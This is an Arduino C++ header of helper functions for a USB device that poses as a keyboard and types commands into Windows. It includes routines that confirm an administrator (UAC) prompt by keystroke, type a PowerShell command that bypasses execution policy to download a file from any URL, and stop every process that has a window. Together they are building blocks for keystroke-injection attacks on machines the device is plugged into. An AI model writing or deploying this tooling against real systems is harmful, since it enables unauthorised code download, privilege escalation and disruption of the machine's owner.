#ifndef S_INSTRUCTIONS_H
#define S_INSTRUCTIONS_H

#include <Keyboard.h>
//#include "complex-instructions.h"

// Basic functions
void run() // Run dialog box
{
    Keyboard.press(KEY_LEFT_GUI); // Press the 'Win' key
    Keyboard.press('r');          // Press 'r'
    Keyboard.releaseAll();        // Release all keys
    delay(1000);                  // Wait for a second
}

void admin() // Run as administrator
{
    
    Keyboard.press(KEY_LEFT_CTRL);  // Press the 'Ctrl' key
    Keyboard.press(KEY_LEFT_SHIFT); // Press the 'Shift' key
    Keyboard.press(KEY_RETURN);     // Press 'Enter'
    Keyboard.releaseAll();          // Release all keys
    delay(1000);                    // Wait for 1 seconds
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);        // Press 'Tab'
    delay(250);                     // Wait for 1/4 a second
    Keyboard.releaseAll();          // Release all keys
    delay(1000);                    // Wait for 1 second
    Keyboard.press(KEY_TAB);        // Press 'Tab'
    delay(250);                     // Wait for 1/4 a second
    Keyboard.release(KEY_TAB);      // Release 'Tab'
    Keyboard.press(KEY_TAB);        // Press 'Tab'
    delay(250);                     // Wait for 1/4 a second
    Keyboard.release(KEY_TAB);      // Release 'Tab'
    delay(500);                     // Wait for half a second
    Keyboard.press(KEY_RETURN);     // Press 'Enter'
    Keyboard.release(KEY_RETURN);   // Release 'Enter'
    delay(1000);                    // Wait for a second
}

void download(String downloadLink, String downloadFile) // Download file from the internet
{
    run();
    String powerShellCommand = "powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('" + downloadLink + "', '" + downloadFile + "')\"";
    Keyboard.println(powerShellCommand);
    delay(1000);
}

void killall()
{
    run();                   // Open the Command Prompt
    delay(500);             // Increase delay to ensure the Command Prompt is fully opened
    Keyboard.println("cmd"); // Type "cmd" to open the Command Prompt
    delay(1500);             // Wait for the Command Prompt to open
    // Properly formatted PowerShell command string for Keyboard.println()
    // Send PowerShell command to close all windows and stop all processes with a main window
    Keyboard.print(F("powershell -command \""));
    delay(250); // Wait for 1/4 a second
    Keyboard.print(F("(New-Object -comObject Shell.Application).Windows() | ForEach-Object {$_.Quit()}; "));
    delay(250); // Wait for 1/4 a second
    Keyboard.print(F("Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process\""));
    Keyboard.press(KEY_RETURN);
    delay(500);                         // Wait for the command to execute
    Keyboard.press(KEY_RETURN);          // Press 'Enter'
    Keyboard.release(KEY_RETURN);        // Release 'Enter'
    // Optional: Uncomment if you want to use Alt+F4 to close the windows instead
    // Keyboard.press(KEY_LEFT_ALT); // Press the 'Alt' key
    // Keyboard.press(KEY_F4);       // Press 'F4'
    // Keyboard.releaseAll();        // Release all keys
    delay(1500); // Wait for a second
}

void saveNotepad(String filename) // Save Notepad file
{
    Keyboard.press(KEY_LEFT_CTRL); // Press the 'Ctrl' key
    Keyboard.press('s');           // Press 's'
    Keyboard.releaseAll();         // Release all keys
    delay(500);                    // Wait for half a second
    Keyboard.print(filename);      // Write the filename
    Keyboard.press(KEY_RETURN);    // Press 'Enter'
    Keyboard.release(KEY_RETURN);  // Release 'Enter'
    delay(1000);                   // Wait for a second
}

void killApp() // Alt + F4
{
    Keyboard.press(KEY_LEFT_ALT); // Press the 'Alt' key
    Keyboard.press(KEY_F4);       // Press 'F4'
    Keyboard.releaseAll();        // Release all keys
    delay(1000);                  // Wait for a second
}

// Screen management
void minimize() // Minimize current window
{
    Keyboard.press(KEY_LEFT_GUI);   // Press the 'Win' key
    Keyboard.press(KEY_LEFT_SHIFT); // Press the 'Shift' key
    Keyboard.press('m');            // Press 'm'
    Keyboard.releaseAll();          // Release all keys
    delay(500);                     // Wait for half a second
}

void showDesktop() // Show desktop
{
    Keyboard.press(KEY_LEFT_GUI); // Press the 'Win' key
    Keyboard.press('d');          // Press 'd'
    Keyboard.releaseAll();        // Release all keys
    delay(500);                   // Wait for half a second
}

#endif